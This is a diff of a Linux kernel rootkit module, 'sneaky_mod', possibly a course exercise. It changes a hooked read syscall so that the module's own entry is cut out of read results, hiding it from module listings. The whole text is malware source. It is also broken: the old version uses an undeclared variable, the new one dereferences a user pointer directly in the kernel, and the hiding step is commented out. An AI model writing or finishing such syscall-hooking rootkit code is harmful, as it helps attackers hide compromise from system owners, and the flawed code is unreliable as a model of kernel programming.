@@ -110,38 +110,43 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent64 __use
   return bytes_read;
 } */
 
-asmlinkage int (*original_read)(int fd, void *buf, size_t count);
+asmlinkage long (*original_read)(struct pt_regs *);
 
-asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
+asmlinkage long sneaky_sys_read(struct pt_regs *regs)
 {
-  int nbytes;
-  char *r_buff;
+
+  long nbytes;
   const char *mod = "sneaky_mod";
-  char *mod_info;
-  char *pos;
-  // 1. Call original read to read the data into the buffer
-  nbytes = (*original_read)(fd, buf, count);
+  char __user *buff;
+  char *end;
+  char *start;
+  // 1. Call original read to read the data into the buffer                                                                                                                          
+
+  nbytes = (*original_read)(regs);
   if (nbytes <= 0)
   {
-    printk("Error reading file\n");
     return nbytes;
   }
-  r_buff = (char *)buf;
 
-  // 2. Search buffer for sneaky_mod info
-  mod_info = strnstr(r_buff, mod, nbytes);
-  if (mod_info != NULL)
+  buff = (char *)regs->si;
+
+  // 2. Search buffer for sneaky_mod info                                                                                                                                            
+  start = strstr(buff, mod);
+
+  if (start != NULL)
   {
-    for (pos = mod_info; pos < (mod_info + nbytes); pos++)
+
+    for (end = start; end < (start + nbytes); end++)
     {
-      if (*pos == '\n')
+
+      if (*end == '\n')
       {
-        char *end = pos + 1; // include the newline
-        size_t n_bytes = nbytes - (end - mod_info);
-        memmove(start, end, n_bytes);
-        nbytes -= (end - mod_info);
-        return nbytes;
-      }
+        end = end + 1; // include the newline                                                                                                                                        
+        size_t n_bytes = (buff + nbytes) - end;
+        /*memmove(start, end, n_bytes);                                                                                                                                              
+        nbytes -= (end - start);                                                                                                                                                     
+        return nbytes*/;
+        }
     }
   }
   return nbytes;
